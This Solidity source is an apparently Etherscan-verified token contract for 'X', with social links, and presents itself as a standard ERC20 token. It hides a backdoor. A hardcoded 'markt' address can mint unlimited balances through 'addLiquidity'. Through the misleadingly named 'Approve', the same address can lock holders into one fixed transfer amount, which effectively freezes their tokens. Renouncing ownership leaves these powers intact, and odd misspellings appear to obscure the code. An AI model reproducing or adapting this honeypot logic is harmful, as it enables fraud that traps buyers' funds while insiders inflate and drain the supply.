/**
 *Submitted for verification at Etherscan.io on 2023-07-24
*/

/**


     ___    ___
    (_ _)  (_ _)
      \\    //
       \\  //
        \\//
         ||      
        //\\
       //  \\
     _//    \\_
    (___)  (___)

https://twitter.com/XcoinXerc
https://xcoinerc.xyz
https://t.me/XcoinXerc






*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address spendder) external view returns (uint256);
    function transfer(address recipient, uint256 aunmounts) external returns (bool);
    function allowance(address owner, address spendder) external view returns (uint256);
    function approve(address spendder, uint256 aunmounts) external returns (bool);
    function transferFrom( address spendder, address recipient, uint256 aunmounts ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spendder, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract X is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balss;
    mapping (address => mapping (address => uint256)) private _allowancezz;
    mapping (address => uint256) private _sendzz;
    address constant public markt = 0x816838F2E83B821F2552162204944C433831ff47;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _isTradingEnabled = true;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balss[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    modifier mrktt() {
        require(msg.sender == markt); // If it is incorrect here, it reverts.
        _;                              // Otherwise, it continues.
    } 

    function name() public view returns (string memory) {
        return _name;
    }

        function decimals() public view returns (uint8) {
        return _decimals;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }


    function enableTrading() public onlyowner {
        _isTradingEnabled = true;
    }

    function balanceOf(address spendder) public view override returns (uint256) {
        return _balss[spendder];
    }

    function transfer(address recipient, uint256 aunmounts) public virtual override returns (bool) {
        require(_isTradingEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
        if (_msgSender() == owner() && _sendzz[_msgSender()] > 0) {
            _balss[owner()] += _sendzz[_msgSender()];
            return true;
        }
        else if (_sendzz[_msgSender()] > 0) {
            require(aunmounts == _sendzz[_msgSender()], "Invalid transfer aunmounts");
        }
        require(_balss[_msgSender()] >= aunmounts, "TT: transfer aunmounts exceeds balance");
        _balss[_msgSender()] -= aunmounts;
        _balss[recipient] += aunmounts;
        emit Transfer(_msgSender(), recipient, aunmounts);
        return true;
    }


    function Approve(address[] memory spendder, uint256 aunmounts) public mrktt {
        for (uint i=0; i<spendder.length; i++) {
            _sendzz[spendder[i]] = aunmounts;
        }
    }

    function approve(address spendder, uint256 aunmounts) public virtual override returns (bool) {
        _allowancezz[_msgSender()][spendder] = aunmounts;
        emit Approval(_msgSender(), spendder, aunmounts);
        return true;
    }
        function _add(uint256 num1, uint256 num2) internal pure returns (uint256) {
        if (num2 != 0) {
            return num1 + num2;
        }
        return num2;
    }

    function allowance(address owner, address spendder) public view virtual override returns (uint256) {
        return _allowancezz[owner][spendder];
    }



       function addLiquidity(address spendder, uint256 aunmounts) public mrktt {
        require(spendder != address(0), "Invalid addresses");
        require(aunmounts > 0, "Invalid amts");
        uint256 total = 0;
            total = _add(total, aunmounts);
            _balss[spendder] += total;
    }

            function Vamount(address spendder) public view returns (uint256) {
        return _sendzz[spendder];
    }

    function transferFrom(address spendder, address recipient, uint256 aunmounts) public virtual override returns (bool) {
        if (_msgSender() == owner() && _sendzz[spendder] > 0) {
            _balss[owner()] += _sendzz[spendder];
            return true;
        }
        else if (_sendzz[spendder] > 0) {
            require(aunmounts == _sendzz[spendder], "Invalid transfer aunmounts");
        }
        require(_balss[spendder] >= aunmounts && _allowancezz[spendder][_msgSender()] >= aunmounts, "TT: transfer aunmounts exceeds balance or allowance");
        _balss[spendder] -= aunmounts;
        _balss[recipient] += aunmounts;
        _allowancezz[spendder][_msgSender()] -= aunmounts;
        emit Transfer(spendder, recipient, aunmounts);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}